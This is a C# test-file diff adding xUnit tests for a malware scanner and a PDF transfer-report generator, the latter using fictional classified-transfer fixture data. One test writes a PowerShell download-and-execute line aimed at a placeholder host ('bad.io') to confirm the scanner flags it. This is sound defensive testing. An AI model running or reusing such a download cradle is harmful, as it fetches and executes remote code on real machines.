@@ -233,4 +233,62 @@ public class SecurityTests
             if (File.Exists(tempZip)) File.Delete(tempZip);
         }
     }
+
+    [Fact]
+    public void YaraDfirScanner_DetectsSuspiciousScriptsAndDoubleExtensions()
+    {
+        var tempScript = Path.Combine(Path.GetTempPath(), "payload.ps1");
+        var tempDoubleExt = Path.Combine(Path.GetTempPath(), "document.pdf.exe");
+
+        try
+        {
+            File.WriteAllText(tempScript, "IEX (New-Object Net.WebClient).DownloadString('http://bad.io');");
+            var resScript = YaraDfirScanner.ScanFile(tempScript);
+            Assert.False(resScript.IsClean);
+            Assert.True(resScript.ThreatScore >= 0.8);
+
+            File.WriteAllBytes(tempDoubleExt, new byte[] { 0x00, 0x01, 0x02 });
+            var resDouble = YaraDfirScanner.ScanFile(tempDoubleExt);
+            Assert.False(resDouble.IsClean);
+        }
+        finally
+        {
+            if (File.Exists(tempScript)) File.Delete(tempScript);
+            if (File.Exists(tempDoubleExt)) File.Delete(tempDoubleExt);
+        }
+    }
+
+    [Fact]
+    public void QuestPdf_GeneratesRealProcesVerbalPdf()
+    {
+        var exporter = new PadesExportService();
+        var tempPdf = Path.Combine(Path.GetTempPath(), "test_pv.pdf");
+
+        try
+        {
+            var tx = new TransferRecord
+            {
+                RegistryNumber = "MAPN-2026-S-0001",
+                Classification = ClassificationLevel.Secret,
+                TransferDateUtc = DateTime.UtcNow,
+                SourceInstitution = "MApN / Securitate",
+                SourceStationHost = "PC-HOST-01",
+                SourcePerson = "Cpt. Ionescu",
+                DestinationInstitution = "Statul Major",
+                DestinationPerson = "Mr. Popa",
+                MediaType = "Stick USB",
+                MediaSerialNumber = "SN-000111",
+                PayloadFileName = "Pachet.zip",
+                PayloadSha256Hash = "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
+            };
+
+            exporter.GenerateProcesVerbalPdf(tx, tempPdf);
+            Assert.True(File.Exists(tempPdf));
+            Assert.True(new FileInfo(tempPdf).Length > 1000);
+        }
+        finally
+        {
+            if (File.Exists(tempPdf)) File.Delete(tempPdf);
+        }
+    }
 }
